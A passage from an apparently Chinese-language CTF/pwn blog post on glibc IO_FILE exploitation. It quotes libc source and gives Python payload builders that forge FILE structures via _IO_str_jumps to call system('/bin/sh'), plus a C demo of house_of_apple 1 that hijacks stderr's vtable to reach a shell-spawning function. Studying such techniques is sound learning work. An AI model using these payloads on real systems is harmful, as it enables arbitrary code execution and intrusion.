  __setbuf &#x3D; 0x7ffff7a88940 &lt;_IO_default_setbuf&gt;,
  __sync &#x3D; 0x7ffff7a88c10 &lt;_IO_default_sync&gt;,
  __doallocate &#x3D; 0x7ffff7a88a30 &lt;__GI__IO_default_doallocate&gt;,
  __read &#x3D; 0x7ffff7a89ae0 &lt;_IO_default_read&gt;,
  __write &#x3D; 0x7ffff7a89af0 &lt;_IO_default_write&gt;,
  __seek &#x3D; 0x7ffff7a89ac0 &lt;_IO_default_seek&gt;,
  __close &#x3D; 0x7ffff7a88c10 &lt;_IO_default_sync&gt;,
  __stat &#x3D; 0x7ffff7a89ad0 &lt;_IO_default_stat&gt;,
  __showmanyc &#x3D; 0x7ffff7a89b00 &lt;_IO_default_showmanyc&gt;,
  __imbue &#x3D; 0x7ffff7a89b10 &lt;_IO_default_imbue&gt;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中，<code>_IO_str_finish</code>的函数源码如下</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">void
_IO_str_finish (_IO_FILE *fp, int dummy)
&#123;
  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))
    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);
  fp-&gt;_IO_buf_base &#x3D; NULL;

  _IO_default_finish (fp, 0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据源码可知，当<code>fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)</code>为真时，篡改<code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code>为<code>system</code>，<code>fp-&gt;_IO_buf_base</code>为<code>/bin/sh</code>即可<code>getshell</code>，同时还需要兼顾触发<code>_IO_flush_all_lockp</code>的条件</p>
<p>因此，一种伪造的条件如下</p>
<blockquote>
<p><code>fp-&gt;_mode</code> &lt;&#x3D; <code>0</code></p>
<p><code>fp-&gt;_IO_write_ptr</code> &gt;<code> fp-&gt;_IO_write_base</code></p>
<p><code>fp-&gt;_flags</code> &#x3D; <code>0</code></p>
<p><code>fp-&gt;_IO_buf_base</code> &#x3D; <code>bin_sh</code></p>
<p><code>fp + 0xe8</code> &#x3D; <code>system_addr</code></p>
<p><code>vtable</code> &#x3D; <code>_IO_str_jumps - 8</code></p>
</blockquote>
<p>其中<code>vtable</code>的设置是因为这样在调用<code>_IO_overflow</code>时会调用<code>_IO_str_finish</code>，<code>fp-&gt;_flags</code> &#x3D; <code>0</code>是因为<code>_IO_USER_BUF</code>是<code>1</code>，而<code>_s._free_buffer</code>的偏移就是<code>0xe8</code>，通过<code>_IO_str_finish</code>可以实现一个交互式的<code>shell</code></p>
<p><code>_IO_str_overflow</code>源码如下</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">int
_IO_str_overflow (_IO_FILE *fp, int c)
&#123;
  int flush_only &#x3D; c &#x3D;&#x3D; EOF;
  _IO_size_t pos;
  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
    &#123;
      fp-&gt;_flags |&#x3D; _IO_CURRENTLY_PUTTING;
      fp-&gt;_IO_write_ptr &#x3D; fp-&gt;_IO_read_ptr;
      fp-&gt;_IO_read_ptr &#x3D; fp-&gt;_IO_read_end;
    &#125;
  pos &#x3D; fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
  if (pos &gt;&#x3D; (_IO_size_t) (_IO_blen (fp) + flush_only))
    &#123;
      if (fp-&gt;_flags &amp; _IO_USER_BUF) &#x2F;* not allowed to enlarge *&#x2F;
	return EOF;
      else
	&#123;
	  char *new_buf;
	  char *old_buf &#x3D; fp-&gt;_IO_buf_base;
	  size_t old_blen &#x3D; _IO_blen (fp);
	  _IO_size_t new_size &#x3D; 2 * old_blen + 100;
	  if (new_size &lt; old_blen)
	    return EOF;
	  new_buf
	    &#x3D; (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
	  ...
&#125;
libc_hidden_def (_IO_str_overflow)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中，可以覆盖<code>*((_IO_strfile *) fp)-&gt;_s._allocate_buffer</code>为<code>system</code>，<code>new_size</code>为<code>/bin/sh</code>来<code>getshell</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">new_buf
	    &#x3D; (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>因此，第二种伪造的条件如下：</p>
<blockquote>
<p><code>_flags</code>&#x3D;<code>0</code></p>
<p><code>_IO_write_base</code> &#x3D; <code>0</code></p>
<p><code>_IO_write_ptr</code> &#x3D; <code>(bin_sh -100) / 2 +1</code></p>
<p><code>_IO_buf_end</code> &#x3D; <code>(bin_sh -100) / 2</code> </p>
<p><code>_IO_buf_base</code> &#x3D; <code>0</code></p>
<p><code>fp + 0xe0</code> &#x3D; <code>system_addr</code></p>
</blockquote>
<p>总结：<code>2.24</code>中会检测<code>vtable</code>地址，因此只能利用原有的跳表，最常用的是<code>_IO_str_jumps</code> ，而利用方法有两种：</p>
<p>第一种：利用<code>IO_str_overflow</code> 函数会调用 <code>FILE+0xe0</code>处的地址，直接改为<code>ogg</code>或调用<code>system(&quot;/bin/sh&quot;)</code>，但这种利用可能会出问题</p>
<p>第二种：利用<code>_IO_str_finish</code>会以 <code>IO_buf_base</code>处的值为参数跳转至 <code>FILE+0xe8</code>处的地址，设置<code>vtable</code>为<code>IO_str_jumps-0x8</code>，发生异常时调用<code>IO_str_overflow</code>根据地址加偏移实际调用的是<code>_IO_str_finish</code>，伪造内容实现调用<code>system(&quot;/bin/sh&quot;)</code></p>
<p>示例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#改_IO_str_finish</span>
p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x200</span>
p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>io_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token number">2</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>io_str_jumps <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p3 <span class="token operator">=</span> p1 <span class="token operator">+</span> p2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#改_IO_str_overflow</span>
p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x200</span>
p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>io_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bin_sh <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>io_str_jumps<span class="token punctuation">)</span>
p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc_2.31"></a>glibc_2.31</h2><p>高阶的<code>IO</code>利用，高版本中<code>__free_hook</code>、<code>__malloc_hook</code>、<code>__calloc_hook</code>都已经被取消，此时只能利用<code>IO</code></p>
<h3 id="house-of-apple-1（large-bin-attack-fsop）"><a href="#house-of-apple-1（large-bin-attack-fsop）" class="headerlink" title="house_of_apple 1（large bin attack + fsop）"></a>house_of_apple 1（large bin attack + fsop）</h3><p><strong>条件</strong>：能够泄露<code>libc</code>和<code>heap</code>地址且程序从<code>main</code>或<code>exit</code>函数结束</p>
<p><strong>过程</strong>：通过一次<code>large bin attack</code>劫持<code>_IO_list_all</code>替换为伪造的<code>IO_FILE</code>结构体，在程序结束的时候会遍历<code>_IO_list_all</code>中的结构体，执行结构体中的<code>vtable-&gt;overflow</code>指向的函数。其次可以利用<code>_wide_data</code>继续修改其他地方的值，在<code>_IO_FILE</code>中<code>_wide_data</code>的偏移是<code>0xa0</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_FILE_complete
&#123;
  struct _IO_FILE _file;
  __off64_t _offset;
  &#x2F;* Wide character stream stuff.  *&#x2F;
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;	&#x2F;&#x2F;***
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  &#x2F;* Make sure we don&#39;t get into trouble again.  *&#x2F;
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>伪造<code>_wide_data</code>中的值之后可以通过<code>_IO_wstrn_overflow</code>来将<code>overflow_buf</code>的值赋给<code>fp-&gt;_wide_data</code>，漏洞在于没有检查<code>fp-&gt;_wide_data</code>的合法性，而这两个都是可控的（通常伪造的<code>_IO_FILE</code>在堆上)，所以能够实现任意地址写</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">static wint_t
_IO_wstrn_overflow (FILE *fp, wint_t c)
&#123;
  &#x2F;* When we come to here this means the user supplied buffer is
     filled.  But since we must return the number of characters which
     would have been written in total we must provide a buffer for
     further use.  We can do this by writing on and on in the overflow
     buffer in the _IO_wstrnfile structure.  *&#x2F;
  _IO_wstrnfile *snf &#x3D; (_IO_wstrnfile *) fp;&#x2F;&#x2F;强转fp为_IO_wstrnfile类型
 
  if (fp-&gt;_wide_data-&gt;_IO_buf_base !&#x3D; snf-&gt;overflow_buf)
    &#123;
      _IO_wsetb (fp, snf-&gt;overflow_buf,
         snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)
                      &#x2F; sizeof (wchar_t)), 0);&#x2F;&#x2F;有时候需要绕过
 
      fp-&gt;_wide_data-&gt;_IO_write_base &#x3D; snf-&gt;overflow_buf;
      fp-&gt;_wide_data-&gt;_IO_read_base &#x3D; snf-&gt;overflow_buf;
      fp-&gt;_wide_data-&gt;_IO_read_ptr &#x3D; snf-&gt;overflow_buf;
      fp-&gt;_wide_data-&gt;_IO_read_end &#x3D; (snf-&gt;overflow_buf
                      + (sizeof (snf-&gt;overflow_buf)
                     &#x2F; sizeof (wchar_t)));
    &#125;
 
  fp-&gt;_wide_data-&gt;_IO_write_ptr &#x3D; snf-&gt;overflow_buf;
  fp-&gt;_wide_data-&gt;_IO_write_end &#x3D; snf-&gt;overflow_buf;
  &#x2F;&#x2F;将_IO_write_base、_IO_read_base、_IO_read_ptr、_IO_read_end、_IO_write_ptr、_IO_write_end都赋为overflow_buf
    
  return c;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中,<code>overflow_buf</code>的偏移是<code>0xf0</code>即<code>vtable</code>后面，<code>_IO_wsetb</code>有时需要绕过<code>free</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">void
_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)
&#123;
  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))
    free (f-&gt;_wide_data-&gt;_IO_buf_base); &#x2F;&#x2F; ***
  f-&gt;_wide_data-&gt;_IO_buf_base &#x3D; b;
  f-&gt;_wide_data-&gt;_IO_buf_end &#x3D; eb;
  if (a)
    f-&gt;_flags2 &amp;&#x3D; ~_IO_FLAGS2_USER_WBUF;
  else
    f-&gt;_flags2 |&#x3D; _IO_FLAGS2_USER_WBUF;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong><code>demo</code></strong></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
<span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m[!] Backdoor is called!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
 
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token keyword">char</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] allocate two 0x200 chunks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token class-name">size_t</span> puts_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>puts<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] puts address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> libc_base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> <span class="token number">0x84420</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] libc base address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>libc_base_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token class-name">size_t</span> _IO_2_1_stderr_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x1ed5c0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] _IO_2_1_stderr_ address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_2_1_stderr_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token class-name">size_t</span> _IO_wstrn_jumps_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x1e8c60</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] _IO_wstrn_jumps address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_wstrn_jumps_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token keyword">char</span> <span class="token operator">*</span>stderr2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_2_1_stderr_addr<span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 1: change stderr->_flags to 0x800"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>stderr2 <span class="token operator">=</span> <span class="token number">0x800</span><span class="token punctuation">;</span>
 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 2: change stderr->_mode to 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xc0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xd8</span><span class="token punctuation">)</span> <span class="token operator">=</span> _IO_wstrn_jumps_addr<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">;</span>
 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 4: replace stderr->_wide_data with the allocated chunk p1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>p1<span class="token punctuation">;</span>
 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p1 <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>p2<span class="token punctuation">;</span>
 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p1 <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">;</span>
 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 7: put backdoor at fake _wide_vtable->_overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 8: call fflush(stderr) to trigger backdoor func"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>说明</strong>：<code>_IO_list_all</code>中第一项就是<code>stderr</code>，首先需要满足<code>fsop</code>的要求</p>
<blockquote>
<p><code>_flags = 0x800</code></p>
<p><code>_mode = 1</code></p>
</blockquote>
<p>接下来改<code>stderr</code>的<code>vtable</code>为<code>_IO_wstrn_jumps-0x20</code>使得<code>_IO_wstrn_jumps</code>恰好落在<code>vtable-&gt;overflow</code>函数被执行</p>
<p>接着为了使<code>_wide_data</code>和<code>_wide_vtable</code>可控将它们改成两个堆的地址，并且在堆中伪造</p>
<blockquote>
<p><code>stderr-&gt;_wide_data = p1</code> </p>
<p><code>stderr-&gt;_wide_data-&gt;_wide_vtable = p2</code></p>
<p><code>stderr-&gt;_wide_data-&gt;_wide_vtable</code>中<code>_IO_write_ptr</code> &gt;  <code>IO_write_base</code></p>
<p><code>_wide_vtable-&gt;_overflow = backdoor</code></p>
</blockquote>
<p>最后刷新<code>_IO_list_all</code>就可以调用到<code>_IO_wstrn_jumps</code>中的<code>overflow</code>函数即<code>backdoor</code></p>

                
            </div>
            <hr/>

            



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/heap/">
                                    <span class="chip bg-color">heap</span>
                                </a>
                            
                                <a href="/tags/pwn/">
                                    <span class="chip bg-color">pwn</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2023/09/24/how2heap/how2heap-chi-xu-geng-xin-ing/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="how2heap">
                        
                        <span class="card-title">how2heap</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            基于堆的漏洞利用
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-24
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/heap/" class="post-category">
                                    heap
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/heap/">
                        <span class="chip bg-color">heap</span>
                    </a>
                    
                    <a href="/tags/pwn/">
                        <span class="chip bg-color">pwn</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/08/12/io-file/io-file/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="IO_FILE">
                        
                        <span class="card-title">IO_FILE</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            IO学习
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-12
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            StarrySky
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/IO/">
                        <span class="chip bg-color">IO</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('20')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
